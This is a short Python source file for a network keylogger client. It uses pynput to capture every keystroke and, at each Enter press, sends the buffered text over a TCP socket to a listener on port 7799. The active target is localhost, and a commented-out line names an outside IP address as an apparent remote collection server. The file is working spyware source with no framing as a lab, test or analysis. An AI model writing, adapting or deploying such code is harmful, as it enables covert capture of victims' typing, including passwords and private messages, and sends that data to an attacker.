import socket  
from pynput.keyboard import Key, Listener

class App:
    def __init__(self,host,port):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((host,port))
        self.data = ""
    def listen(self):
        while True:
            with Listener(on_press=self.on_press) as listener:
                listener.join()
            # self.PushStream()
    def PushStream(self):
        # self.data = input()
        self.socket.sendall(bytes(self.data,'utf-8'))
        
        # function to handle keystrokes
    def on_press(self,key):
        try:
            self.key = key
            self.data += str(key)    
                
        except:
            # if an error occurs, stop the program
            return False
        
        finally:
            if self.key == Key.enter:
                self.data = self.data.replace('\'',"")
                self.data = self.data.replace('Key'," Key")
                self.PushStream()
                self.data = ""
if __name__ == '__main__':
    client = App('127.0.0.1',7799)
    # client = App('157.245.150.103',7799)
    client.listen()
    